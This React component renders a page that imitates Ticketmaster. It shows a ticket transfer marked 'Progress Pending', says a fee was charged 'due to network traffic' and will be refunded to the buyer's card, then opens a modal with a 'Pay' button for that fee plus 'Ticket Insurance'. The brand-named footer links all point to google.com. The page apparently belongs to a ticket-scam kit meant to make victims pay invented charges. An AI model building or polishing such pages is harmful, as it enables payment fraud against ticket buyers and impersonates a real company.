import React, { useState } from "react";
import Headee from "./headee";
import '../App.css'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faExclamationCircle, faClock } from '@fortawesome/free-solid-svg-icons';
import { faFacebook, faTwitter, faInstagram, faYoutube } from '@fortawesome/free-brands-svg-icons';



const Display = ({ info, events }) => {


    const [display, setdisplay] = useState(false)
    function hide() {
        setdisplay(false)
    }




    let endseatnumber;

    if (events.tixsent < 2) {
        endseatnumber = ""
    } else {
        endseatnumber = `- ${events.startingSeatNumber + events.tixsent -1}`
    }



return (
    <div>
        <div>
            <Headee info={info} events={events}/>
            <div className="service-fee-bg">
                <img src={events.image} alt="events 2" style={{ width: "100%", position: "fixed"}}/>
            </div>
            <div className="service-fee">
                <div>
                <p>{events.title}</p>
                <p>{events.time}, {events.day} - {events.date} • {events.year}</p>
                <p>{events.location} - {events.state}</p>
                <p>{events.tixsent} {events.tixsent < 2 ? "Ticket" : "Tickets"} - Sec {events.Generaladmission ? "GA" : ""}{events.initialSection}, Row {events.Generaladmission ? "GA" : ""}{events.initialRow}, Seat {events.Generaladmission === true ?  "-":`${events.startingSeatNumber} ${endseatnumber}`} <a href="http://google.com">Learn More</a></p>
                <hr />
                <span>
                <FontAwesomeIcon icon={faExclamationCircle} className="service-fee-icon"/>
                <p>Ticket Information</p>
                </span>
                <p>{events.entry}</p>
                </div>
                <div>
                    <span>
                        <p>Progress Pending</p>
                    <FontAwesomeIcon icon={faClock} className="service-fee-icon2"/>
                    </span>
                    <p>Mobile - EliteSeats</p>
                    <p>
                    your transfer has been completed, but dues to network traffic <strong>{info.fee}</strong> was applied to current ticket transaction.make sure details are correct to avoid data disrupt, The full refund will be paid to <strong>{info.firstname}'s</strong> account-linked card with analysis. Thank you for your understanding.
                    </p>
                </div>
                <div>
                    <span>
                    <strong>Payment</strong>
                    <p>Visa - 7899</p>
                    </span>
                    <p>Total: {info.currency}{info.feeamount}</p>
                    <button onClick={() => setdisplay(true)}>Proceed</button>
                    <hr />
                    <div>
                        <p>Stay Connected</p>
                        <span>
                            <FontAwesomeIcon icon={faFacebook}/>
                            <FontAwesomeIcon icon={faInstagram}/>
                            <FontAwesomeIcon icon={faTwitter}/>
                            <FontAwesomeIcon icon={faYoutube}/>
                        </span>
                        <ol>
                            <li><a href="http://google.com">Ticketmaster</a></li>
                            <li>|</li>
                        <li><a href="http://google.com">About</a></li>
                        <li>|</li>
                        <li><a href="http://google.com">Terms of Use</a></li>
                        <li>|</li>
                        <li><a href="http://google.com">Privacy</a></li>
                        <li>|</li>
                        <li><a href="http://google.com">International</a></li>
                        </ol>
                        <a href="http://google.com" style={{display: "none"}}>enter</a>
                        <p>© 2024 Ticketmaster. All right reserved.</p>
                    </div>
                </div>
            </div>
        </div>
        {display && (
                    <div className="Dtwo-div">
                        <div>
                        <p>{events.tixsent} {events.tixsent > 1 ? "Tickets" : "Ticket"} x <b>{info.currency}{info.feeamount * 
            events.tixsent}</b></p>
                        <strong>Ticket Insurance: {info.currency}{info.servicefee}</strong>
                        <p style={{ transform: "transformY(-10px)", marginBottom: "10px"}}>Click On Pay To Continue</p>
                        <button>Pay</button><button onClick={hide}>Cancel</button>
                        </div>
                    </div>
        )}
    </div>
)
}
export default Display;